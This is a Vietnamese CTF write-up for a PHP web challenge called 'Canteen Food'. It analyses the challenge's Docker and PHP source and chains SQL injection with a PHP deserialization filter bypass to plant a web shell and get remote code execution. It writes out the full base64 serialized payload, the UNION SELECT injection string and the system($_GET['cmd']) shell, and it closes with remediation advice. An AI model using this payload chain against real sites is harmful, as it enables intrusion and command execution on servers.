---
title: Canteen Food
date: 2026-01-09 12:00:00 +0700
categories: [Web Exploitation, SQL Injection, PHP Deserialization]
tags: [web, sql, php]
author: khoa
description: A random CTF CHALL sent to me by Pzhat
toc: true
comments: true
---

## **Cách mình làm**
### Setup

![img-description](https://i.ibb.co/202fNgsH/image-2026-01-09-094041142.png)
_Source Files_

Nhìn vào file đề cho thì ta thấy nó sẽ được build và chạy bằng ```Docker```, nên đầu tiên chúng ra sẽ cài đặt Docker và chạy nó, về phần cài đặt Docker thì các bạn tự tìm hiểu nha.

### Recon & Đọc Source Code
#### Recon
Sau khi build và chạy container, truy cập vào ```localhost``` thì chúng ta có 1 website như sau:
![img-description](https://i.ibb.co/C5MDJ7v3/image-2026-01-09-094847215.png)
_Website_

Cơ bản thì khi bạn nhập 1 giá tiền vào thanh tìm kiếm, nó sẽ đưa ra những món ăn có giá tiền thấp hơn giá tiền mà bạn đã nhập.

Sau một hồi nghịch ngợm ở đây thì mình thấy ở đây có thêm 1 directory là ```/admin```, nhưng cũng không có gì thú vị lắm.

![img-description](https://i.ibb.co/27cyLrZN/image-2026-01-09-095400500.png)
_Admin_

#### Phân tích Source Code

##### Dockerfile
Đầu tiên mình kiểm tra file ```Dockerfile```:
```Dockerfile
FROM debian:bullseye-slim@sha256:6344a6747740d465bff88e833e43ef881a8c4dd51950dba5b30664c93f74cbef

# Setup user
RUN useradd www

# Install system packeges
RUN apt-get update && apt-get install -y supervisor nginx lsb-release mariadb-server mariadb-client wget gcc

# Add repos
RUN wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
RUN echo "deb https://packages.sury.org/php/ bullseye main" | tee /etc/apt/sources.list.d/php.list

# Install PHP dependencies
RUN apt update && apt install -y php7.1-fpm php7.1-mysql

# Configure php-fpm and nginx
COPY config/fpm.conf /etc/php/7.1/fpm/php-fpm.conf
COPY config/supervisord.conf /etc/supervisord.conf
COPY config/nginx.conf /etc/nginx/nginx.conf
COPY config/mariadb.conf /etc/mysql/mariadb.conf.d/50-server.cnf

# Copy challenge files
COPY challenge /www

# Copy flag
COPY flag.txt /
COPY logs.txt /


# Add readflag binary and prepare flag
COPY readflag.c /
RUN gcc /readflag.c -o /readflag \
    && chown root:root /readflag \
    && chmod +s /readflag \
    && rm /readflag.c \
    && chmod 400 /flag.txt

# Setup permissions
RUN chown -R www:www /www /var/lib/nginx
RUN chown www:www /logs.txt

RUN apt-get remove gcc wget -y

# Expose the port nginx is listening on
EXPOSE 80

# Start db and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

Nội dung file này chỉ là những câu lệnh để tạo ra 1 máy chủ web chạy bằng ```PHP 7.1```, cài sẵn ```MariaDB```.

##### entrypoint.sh
```bash
#!/bin/bash

chmod 600 /entrypoint.sh

mkdir -p /run/mysqld
chown -R mysql:mysql /run/mysqld
mysql_install_db --user=mysql --ldata=/var/lib/mysql
mysqld --user=mysql --console --skip-name-resolve --skip-networking=0 &

while ! mysqladmin ping -h'localhost' --silent; do echo "not up" && sleep .2; done


export DB_USER="user_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)"
export DB_NAME="db_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)"

mysql -u root << EOF
CREATE DATABASE $DB_NAME;
CREATE TABLE $DB_NAME.food (
    id INT NOT NULL AUTO_INCREMENT,
    name VARCHAR(255),
    oldvalue VARCHAR(255),
    price float,
    PRIMARY KEY (id)
);

INSERT INTO $DB_NAME.food (name, oldvalue, price) VALUES ('Spaghetti', '', 2.99);
INSERT INTO $DB_NAME.food (name, oldvalue, price) VALUES ('Burger', '', 100.99);
INSERT INTO $DB_NAME.food (name, oldvalue, price) VALUES ('Cookies', '', 22.30);
INSERT INTO $DB_NAME.food (name, oldvalue, price) VALUES ('Lasagna', '', 7.50);
INSERT INTO $DB_NAME.food (name, oldvalue, price) VALUES ('Schnitzel', '', 5000.99);
INSERT INTO $DB_NAME.food (name, oldvalue, price) VALUES ('','YToyOntpOjA7czo1OiJQaXp6YSI7aToxO2Q6MC45OTt9', 0);

CREATE USER '$DB_USER'@'%';
GRANT SELECT, UPDATE ON *.* TO '$DB_USER'@'%';
ALTER USER 'root'@'localhost' IDENTIFIED BY 'test123';
FLUSH PRIVILEGES;

EOF

echo -e "fastcgi_param DB_NAME $DB_NAME;\nfastcgi_param DB_USER $DB_USER;\nfastcgi_param DB_PASS '';" >> /etc/nginx/fastcgi_params

/usr/bin/supervisord -c /etc/supervisord.conf
```
File trên dùng để bật và khởi tạo database, và kết nối giữa Web và DB để mà nguồn có thể chạy được.

ở dòng 31 của đoạn code trên, mình có thấy 1 chuỗi text khá kì lạ:
```text
YToyOntpOjA7czo1OiJQaXp6YSI7aToxO2Q6MC45OTt9
```

Sau khi thử decode bằng base64 thì mình có 1 chuỗi PHP đã được Serialize như sau:
```text
a:2:{i:0;s:5:"Pizza";i:1;d:0.99;}
```

Và mình nghi ngờ rằng web này sẽ có lỗ hỏng ```PHP Deserialized```, qua đó mình cũng biết được dữ liệu của bảng ```food``` có 4 cột.

##### Model
**CanteenModel.php**

```php
<?php
class CanteenModel {


    public function getFood() {
        $log_entry = 'Access at: '. date('Y-m-d H:i:s') . "<br>\n";
        $logger = new AdminModel("/logs.txt", $log_entry);

        $db = Database::getConnection();
        $sql = "SELECT * FROM food";
        if ($result = $db->query($sql)) {
            $result_string = "";
            while($obj = $result->fetch_object()){
                if($obj->name !== '') {
                    $result_string .= $obj->name . ' for ' . $obj->price . '€ <br>';
                    $db->query("UPDATE food SET price = " . (rand(0, 100000) / 100) . " WHERE name = \"" . $obj->name. "\"");
                }

                if($obj->oldvalue !== '') {
                    $dec_result = base64_decode($obj->oldvalue);
                    if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
                        return 'Not allowed';
                    }
                    $uns_result = unserialize($dec_result);
                    $result_string .= $uns_result[0] . ' for ' . $uns_result[1] . '€<br>';
                    $new_value = [$uns_result[0], (rand(0, 100000) / 100)];
                    $db->query("UPDATE food SET oldvalue = \"" . base64_encode(serialize($new_value)) . "\" WHERE oldvalue = \"" . $obj->oldvalue . "\"");
                }
            }
            return $result_string;
        }
        return 'No food this week - we\'re closed';
    }

    public function filterFood($price_param) {
        $log_entry = 'Access at: '. date('Y-m-d H:i:s') .   "<br>\n";
        $logger = new AdminModel("../logs.txt", $log_entry);


        $db = Database::getConnection();
        $sql = "SELECT * FROM food where price < " . $price_param;
        if ($result = $db->query($sql)) {
            $result_string = "";
            while($obj = $result->fetch_object()){
                if($obj->name !== '') {
                    $result_string .= $obj->name . ' for ' . $obj->price . '€ <br>';
                }

                if($obj->oldvalue !== '') {
                    $dec_result = base64_decode($obj->oldvalue);
                    if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
                        return 'Not allowed';
                    }
                    $uns_result = unserialize($dec_result);
                    if ($uns_result[1] < $price_param) {
                        $result_string .= $uns_result[0] . ' for ' . $uns_result[1] . '€<br>';
                    }
                }
            }

            if($result_string === "") {
                return 'Everything is too expensive for you this week, Sir/Madame. We\'re sorry!';
            }
            return $result_string;
        }

        return 'Everything is too expensive for you this week, Sir/Madame. We\'re sorry!';
    }
}

```

Sau khi phân tích thì mình thấy hàm ```filterFood($price_param)``` trong CanteenModel thực hiện nối chuỗi trực tiếp:

```php
$sql = "SELECT * FROM food where price < " . $price_param;
```

Cho phép chúng ta sử dụng ```UNION SELECT``` để điều khiển dữ liệu trả về từ Database.

Ngoài ra dữ liệu từ cột ```oldvalue``` sẽ đi thẳng vào:

```php
$uns_result = unserialize($dec_result);
```
=> Confirm lỗ hỏng là ```PHP Deserialization``` và ```SQL Injection```.

Mặc dù đã có 1 lớp Regex chặn các đối tượng khởi đầu bằng ```O:\d+```:

```php
if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
      return 'Not allowed';
}
```
nhưng chúng ta có thể bypass bằng cách thêm dấu ```+``` vào độ dài của class. Ví dụ như ```O:+10:"AdminModel"```.

**AdminModel.php**

```php
<?php

if($_SESSION["admin"] === false){
    return "You're not welcome. This part is only for canteen workers.";
}


class AdminModel {
    public $filename;
    public $logcontent;

    public function __construct($filename, $content) {
        $this->filename = $filename;
        $this->logcontent = $content;
        file_put_contents($filename, $content, FILE_APPEND);
    }

    public function __wakeup() {
        new LogFile($this->filename, $this->logcontent);
    }

    public static function read_logs($log) {
        $contents = file_get_contents($log);
        return $contents;
    }
}

class LogFile {
    public function __construct($filename, $content) {
        file_put_contents($filename, $content, FILE_APPEND);
    }
}
```

Nhìn vào đây mình thấy được ở hàm ```__construct($filename, $content)``` thì mình thấy lệnh sau:

```php
file_put_contents($filename, $content, FILE_APPEND);
```

Mình nghĩ ngay đến ```RCE``` thông qua việc tạo 1 log file có đuôi ```.php``` với nội dung mà chúng ta có thể tuỳ chỉnh, nhưng vấn đề lớn ở đây là hàm ```__construct($filename, $content)``` của ```AdminModel```, nó sẽ set tên file và nội dung khi ta gọi ```new``` ở ```CanteenModel.php```:

```php
$log_entry = 'Access at: '. date('Y-m-d H:i:s') .   "<br>\n";
$logger = new AdminModel("../logs.txt", $log_entry);
```

Vậy thì giờ chúng ta phải làm gì?

**CÁI CHÚNG TA CẦN CHÍNH LÀ HÀM ```__wakeup()```!!!**

Khi chúng ta sử dụng hàm ```unserialize()```, nó sẽ bỏ qua hàm ```__construct```, và gọi thẳng vào hàm ```__wakeup()```.

Hiểu nôm na là:

```text
- New sẽ như bạn tạo một nhân vật mới trong game thông qua Construct, dữ liệu sẽ hoàn toàn được tạo mới.
- Unserialize sẽ như bạn load sẽ một nhân vật có sẵn, nó gọi thẳng Wakeup và dữ liệu sẽ được nhập vào DB.
```

#### Hướng giải
Sau khi phân tích source code đã đời thì mình sẽ thực hiện tấn công thông qua ```SQL INJECTION``` và ```PHP Deserialization```.

### Nghịch
#### Payload
Đầu tiên mình xây dựng 1 chuỗi PHP đã được serialize như sau:

```php
a:3:{i:0;s:7:"SKIBIDI";i:1;s:1:"1";i:2;O:+10:"AdminModel":2:{s:8:"filename";s:9:"shell.php";s:10:"logcontent";s:30:"<?php system($_GET['cmd']); ?>";}}
```

Sau đó encode nó với Base64:

```text
YTozOntpOjA7czo3OiJTS0lCSURJIjtpOjE7czoxOiIxIjtpOjI7TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6OToic2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO319
```

Rồi mình xây dựng 1 payload SQL sử dụng ```UNION SELECT```:

```sql
-1 UNION SELECT 1, 'test', 'YTozOntpOjA7czo3OiJTS0lCSURJIjtpOjE7czoxOiIxIjtpOjI7TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6OToic2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO319', 4-- -
```

##### Giải thích payload

**Chuỗi PHP Serialized**
```a:3```: để khai báo 1 mảng vì source code truy cập dữ liệu theo dạng mảng (ở file ```CanteenModel.php```).

```i:0;s:7:"SKIBIDI";```: Phần tử index 0, giá trị là chuỗi "SKIBIDI".

```i:1;s:1:"1";```: Phần tử index 1, giá trị là chuỗi "1".

```O:+10:"AdminModel":2:{s:8:"filename";s:9:"shell.php";s:10:"logcontent";s:30:"<?php system($_GET['cmd']); ?>";```: đây là đối tượng chính để tạo ra file log với ```filename``` là ```shell.php``` với ```logcontent``` là ```<?php system($_GET['cmd']); ?>```, với ```AdminModel``` là tên class mà chúng ta muốn khởi tạo lại

**SQL**
Câu truy vấn SQL thêm ```-1```: vì giá của các món ăn trong bảng ```food``` luôn là số dương, việc thêm số -1 sẽ làm db trả về kết quả rỗng vì không có món ăn nào có ```price < -1```.

Sử dụng ```UNION```: dùng để kết hợp kết quả của 2 câu lệnh ```SELECT```, ép Database chỉ trả về dữ liệu của câu lệnh phía sau bằng việc kết hợp với truy vấn có số ```-1``` ở trước.

Dấu ```-- -```: Để comment lại tất cả các câu truy vấn phía sau, giúp không xảy ra lỗi khi câu truy vấn được thực thi.

#### Thực thi
Sau khi dán toàn bộ payload vào thanh tìm giá thì kết quả trả về như sau:
![img-description](https://i.ibb.co/Sw18fqsB/image-2026-01-09-110808673.png)
_Tạo file thành công_

Nó đã trả về dữ liệu mà chúng ta muốn, giờ thử truy cập vào ```/shell.php?cmd=``` và thực hiện ```RCE```:
![img-description](https://i.ibb.co/HDg6WKsZ/image-2026-01-09-112006198.png)
_RCE Thành Công_

![img-description](https://i.ibb.co/bMHfnpvs/image-2026-01-09-112612366.png)
_Tiếp tục xem_

Và chúng ta có được flag:

![img-description](https://i.ibb.co/VY938B55/image-2026-01-09-112739527.png)
_Lấy flag_

## **Kết luận**
### Bản chất
Bản chất của bài này là một chuỗi tấn công, RCE thông qua việc sử dụng ```SQL INJECTION``` và ```PHP DESERIALIZATION```

Có ```SQLi``` vì truy vấn cho phép nối chuỗi, không validate, và chúng ta có thể sử dụng ```-1``` và ```UNION SELECT``` để ép Database trả về dữ liệu mà ta mong muốn.

Có ```PHP Deserialization``` vì source code sử dụng hàm ```unserialize()``` mà không hề kiểm soát chặt chẽ.

### Kinh nghiệm rút ra
Thay vì nối chuỗi trực tiếp thì có thể sử dụng ```?``` làm placeholder cho dữ liệu, và phải kết hợp với việc validate input, ép kiểu và sử dụng filter để không bị SQL Injection. Phải hạn chế quyền hạn của user, không nên cho phép các quyền hạn tối cao.

Tuyệt đối không bao giờ deserialize dữ liệu từ người dùng hoặc database mà không có cơ chế kiểm soát chặt chẽ. Có thể thay bằng ```json_decode()```để tránh việc tự động khởi tạo object.

Magic method cũng là con dao 2 lưỡi (```__wakeup()```, ```__destruct()```), giúp lập trình tiện hơn nhưng cũng dễ bị mấy anh hacker đục hơn :v

### Lời kết
Thôi thì bài writeup của mình cũng chỉ đến đây thôi =))) Chúc các bạn 1 ngày vui vẻ, mình ngủ đây.





